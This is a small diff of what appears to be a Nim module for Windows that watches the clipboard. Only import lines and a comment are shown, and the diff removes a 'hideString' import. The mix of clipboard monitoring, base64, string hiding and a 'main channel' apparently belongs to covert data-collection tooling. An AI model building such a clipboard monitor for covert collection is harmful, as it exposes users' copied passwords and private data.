@@ -1,7 +1,6 @@
 ## TEMPORARY SOLUTION,
 ## MIGHT CONSIDER USING GETMESSAGE HOOKS
 ## FOR WATCHING THE CLIPBOARD
-
 from os import sleep
 
 from base64 import encode
@@ -17,8 +16,6 @@ from winim/inc/winbase import GlobalUnlock
 from winim/inc/winbase import GlobalLock
 
 from ../flags import CLIPBOARD_THREAD_CHECK_INTERVAL
-
-import ../functions/hideString
 
 from ../channels import mainChannel
 
